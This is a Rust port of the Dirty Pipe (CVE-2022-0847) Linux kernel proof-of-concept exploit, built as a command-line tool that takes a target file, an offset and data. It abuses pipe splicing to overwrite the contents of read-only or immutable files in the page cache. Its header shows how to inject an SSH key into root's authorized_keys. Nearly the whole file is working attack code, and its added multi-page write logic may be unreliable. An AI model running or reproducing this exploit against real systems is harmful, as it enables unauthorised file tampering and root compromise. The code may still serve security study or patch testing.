#![feature(layout_for_ptr)]

/* Original Poc by Max Kellermann */
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

/*
The original PoC has the follow issues:
- the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)
- the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)
- the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)
*/

use clap::{arg, App};
use libc;
use log::{debug, error, info};
use std::alloc::Layout;
use std::ffi;
use std::os::raw::{c_char, c_void};
use std::process;
use std::slice;

const PAGE_SIZE: usize = 4096;

fn prepare_pipe(pipe: *mut i32) -> *mut i32 {
    info!("preparing pipe");
    let pipe_success = unsafe { libc::pipe(pipe) };
    debug!("+ pipe errno: {}", pipe_success);

    let slice = unsafe { slice::from_raw_parts_mut(pipe, 2) };
    let pipe_capacity = unsafe { libc::fcntl(slice[0] as i32, libc::F_GETPIPE_SZ) };
    let pipe_wcapacity = unsafe { libc::fcntl(slice[1] as i32, libc::F_GETPIPE_SZ) };

    debug!("tx_cap: {}; rx_cap: {}", pipe_wcapacity, pipe_capacity);

    let mut char_buffer: [char; PAGE_SIZE] = ['a'; PAGE_SIZE];

    /* In Linux versions before 2.6.11, the capacity of a pipe was the
       same as the system page size (e.g., 4096 bytes on i386).  Since
       Linux 2.6.11, the pipe capacity is 16 pages (i.e., 65,536 bytes
       in a system with a page size of 4096 bytes).  Since Linux 2.6.35,
       the default pipe capacity is 16 pages, but the capacity can be
       queried and set using the fcntl(2) F_GETPIPE_SZ and F_SETPIPE_SZ
       operations.
    */

    let mut w = pipe_wcapacity;
    while w > 0 {
        let n = if w > char_buffer.len() as i32 {
            char_buffer.len() as i32
        } else {
            w
        };

        debug!("+++ writing {} bytes -- PipeBuffer Capacity: {}", n, w);

        unsafe {
            libc::write(
                slice[1] as i32,
                char_buffer.as_mut_ptr() as *const c_void,
                n as usize,
            )
        };
        w -= n
    }

    debug!("pipe full!! pipe_size: {}", pipe_capacity);

    let mut r = pipe_capacity;
    while r > 0 {
        let n = if r > char_buffer.len() as i32 {
            char_buffer.len() as i32
        } else {
            r
        };

        debug!("--- reading {} bytes -- PipeBuffer Size: {}", n, r);

        unsafe {
            libc::read(
                slice[0] as i32,
                char_buffer.as_mut_ptr() as *mut c_void,
                n as usize,
            )
        };

        r -= n
    }

    info!("pipe prepared!");
    pipe
}

fn main() {
    env_logger::init();

    let matches = App::new("dirty-pipe")
        .about("CVE-2022-0847")
        .arg(
            arg!(
                -t --target <FILE> "TargetFile"
            )
            .required(true),
        )
        .arg(
            arg!(
                -o --offset <OFFSET> "Offset"
            )
            .required(true),
        )
        .arg(
            arg!(
                -d --data <DATA> "Data"
            )
            .required(true),
        )
        .get_matches();

    let target_file = matches.value_of("target").unwrap_or_else(|| {
        error!("could not parse target_file");
        process::exit(1)
    });

    let mut offset = matches
        .value_of("offset")
        .unwrap_or_else(|| {
            error!("could not parse offset");
            process::exit(1)
        })
        .parse::<libc::c_longlong>()
        .unwrap_or_else(|_| {
            error!("could not parse offset to c_longlong:i64");
            process::exit(1)
        });

    let mut data = matches.value_of("data").unwrap_or_else(|| {
        error!("could not parse data");
        process::exit(1)
    });

    if offset % PAGE_SIZE as i64 == 0 {
        error!("can't start writing at a page boundary");
        process::exit(1);
    }

    // is write trying to cross a page boundary?
    // write first pipe. setup new pipe
    let next_page = (offset | (PAGE_SIZE as i64 - 1)) + 1;
    let end_offset = offset + data.len() as i64;

    if end_offset > next_page {
        debug!(
            "you cannot write across a page boundary. we'll try to set up a new pipe. \
            expected end_offset -> {}; \
            next_page start -> {}; \
            bytes over page: {}",
            end_offset,
            next_page,
            (end_offset - next_page)
        );
    }

    // number of pages / pipes we'll create
    let pages = (offset + data.len() as i64) / PAGE_SIZE as i64;

    let file_to_open = ffi::CString::new(target_file).expect("c_char conversion failed");
    let fd = unsafe { libc::open(file_to_open.as_ptr() as *const c_char, libc::O_RDONLY) };

    let mut bytes_to_write = 0;
    for i in 0..=pages {
        // prepare pipe
        info!("starting pipe setup");
        let pipe_layout = Layout::new::<[i32; 2]>();
        let pipe = unsafe { std::alloc::alloc(pipe_layout) };
        let pipe = prepare_pipe(pipe as *mut i32);

        let slice = unsafe { slice::from_raw_parts_mut(pipe, 2) };

        // reset the offset after the first pipe splice
        if i > 0 {
            offset = 0;
        } else {
            offset = offset - 1;
        }

        debug!("offset set to {}", offset);

        let nbytes =
            unsafe { libc::splice(fd, &mut offset, slice[1] as i32, std::ptr::null_mut(), 1, 0) };

        if nbytes < 0 {
            error!("slice failed");
            process::exit(1);
        } else if nbytes == 0 {
            error!("short splice");
            process::exit(1);
        }

        info!("spliced {} bytes from page into pipe", nbytes);

        if data.len() >= PAGE_SIZE {
            // write would run onto the next page
            bytes_to_write = data.len() - (PAGE_SIZE - offset as usize);
        } else {
            if (data.len() + offset as usize) > PAGE_SIZE {
                if offset as usize > PAGE_SIZE && data.len() < PAGE_SIZE {
                    // offset is past a page boundary, but the data is less than
                    // the next page's size. write the rest of the data.
                    bytes_to_write = data.len();
                } else {
                    // write data up until the next page boundary
                    bytes_to_write = PAGE_SIZE - offset as usize;
                }
            } else {
                // data fits in the page. write it all
                bytes_to_write = data.len();
            }
        }

        debug!(
            "write for page: {}; offset: {}: bytes: {}: data: {}",
            i,
            offset,
            bytes_to_write,
            &data[..bytes_to_write]
        );

        let data_to_write =
            ffi::CString::new(&data[..bytes_to_write]).expect("c_char conversion failed");

        debug!("c format string: {:?}", data_to_write);

        let nbytes = unsafe {
            libc::write(
                slice[1] as i32,
                data_to_write.as_ptr() as *const c_void,
                data_to_write.as_bytes().len(),
            )
        };

        if nbytes <= 0 {
            error!("failed to write bytes to page cache");
            process::exit(1);
        }

        info!("success!! wrote {} bytes", nbytes);

        data = &data[bytes_to_write..];
        if data.len() <= 0 {
            break;
        }

        unsafe {
            std::alloc::dealloc(pipe as *mut u8, pipe_layout);
        };
    }
}
